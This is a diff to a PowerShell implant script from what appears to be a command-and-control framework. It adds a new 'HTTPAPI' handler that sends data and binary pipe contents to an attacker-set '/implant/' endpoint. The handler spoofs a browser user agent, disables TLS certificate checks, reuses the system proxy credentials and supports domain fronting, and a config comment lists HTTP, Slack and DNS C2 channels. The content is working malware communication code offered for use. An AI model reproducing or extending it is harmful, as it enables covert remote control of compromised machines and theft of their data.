@@ -305,6 +305,83 @@
         }
     }
 
+    function POSTHTTPAPI($httphost, $targetUrl, $body, $binary, $front){
+        try{
+            $baseUrl = $httphost.TrimEnd("/");
+            if($baseUrl.ToLower().EndsWith("/implant")){
+                $fullUrl = $baseUrl + "/" + $targetUrl;
+            }else{
+                $fullUrl = $baseUrl + "/implant/" + $targetUrl;
+            }
+
+            if($null -ne $body){
+                if($binary){
+                    $bodyEnc = $body;
+                }else{
+                    $bodyEnc = [System.Text.Encoding]::UTF8.GetBytes($body);
+                }
+            }else{
+                $bodyEnc = @()
+            }
+
+            $postrequest = [System.Net.WebRequest]::Create($fullUrl);
+            $postrequest.Method = "POST";
+            try{
+                $proxy = [System.Net.WebRequest]::GetSystemWebProxy();
+                $proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
+                $postrequest.proxy = $proxy;
+            }catch{}
+
+            $postrequest.UserAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";
+            [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
+
+            if($binary){
+                $postrequest.ContentType = "application/octet-stream";
+            }else{
+                $postrequest.ContentType = "application/json; charset=utf-8";
+            }
+
+            if($null -ne $front){
+                $postrequest.host = $front;
+            }
+
+            try {
+                $requestStream = $postrequest.GetRequestStream();
+                $requestStream.Write($bodyEnc, 0, $bodyEnc.Length);
+            }
+            finally {
+                if ($null -ne $requestStream) { $requestStream.Dispose(); }
+            }
+
+            try{
+                $response = $postrequest.GetResponse();
+                $outStream = $response.GetResponseStream();
+                $memStream = New-Object System.IO.MemoryStream;
+                $myBuffer = [System.Byte[]]::CreateInstance([System.Byte], 4096);
+                $bytesRead = 0;
+                while (($bytesRead = $outStream.Read($myBuffer, 0, 4096)) -gt 0)
+                {
+                    $memStream.Write($myBuffer, 0, $bytesRead);
+                }
+                $result = $memStream.ToArray();
+            }finally{
+                if ($null -ne $outStream) { $outStream.Dispose(); }
+                if ($null -ne $memStream) { $memStream.Dispose(); }
+            }
+
+            if($binary -eq $true){
+                return $result;
+            }
+            return ConvertFrom-Json ([System.Text.Encoding]::UTF8.GetString($result).Trim([char]0));
+        }catch{
+            if($_.Exception.InnerException.Response.StatusCode -eq 404){
+                throw "404";
+            }else{
+                throw $_;
+            }
+        }
+    }
+
     function POSTREQ($targetUrl, $body){
         $handlers = $config.handlers.split(",");
         $ExcMessage = "";
@@ -313,6 +390,9 @@
                 $handler = $handlers[$i].split("|");
                 if($handler[0] -eq "HTTPAES256"){
                     Return POSTHTTP $handler[1] $targetUrl $body $false;
+                }
+                elseif($handler[0] -eq "HTTPAPI"){
+                    Return POSTHTTPAPI $handler[1] $targetUrl $body $false $null;
                 }
                 elseif($handler[0] -eq "SLACK"){
                     Return POSTSlack $targetUrl $body;
@@ -346,6 +426,13 @@
                         $targetUrl = $targetUrl + "?max=" + $maxSize;
                     }
                     Return POSTHTTP $handler[1] $targetUrl $data $true $null ;
+                }
+                elseif($handler[0] -eq "HTTPAPI"){
+                    $targetUrl = "bin/" + $pipe;
+                    if ($maxSize -ne $null){
+                        $targetUrl = $targetUrl + "?max=" + $maxSize;
+                    }
+                    Return POSTHTTPAPI $handler[1] $targetUrl $data $true $null;
                 }
                 elseif($handler[0] -eq "SLACK"){
                     $Body = @{
@@ -920,6 +1007,7 @@ $config.buffersize=65536
 
 # Handler list separated by commas
 # HTTP/HTTPS: HTTPAES256|https://WWW.WEBSITE.COM
+# Node HTTP API handler: HTTPAPI|https://WWW.WEBSITE.COM
 # Domain Fronting: HTTPAES256FRONT|https://WWW.REALWEBSITE.COM|FAKEFRONT.COM
 # Slack: SLACK
 # DNS: DNSAES256|domain.com
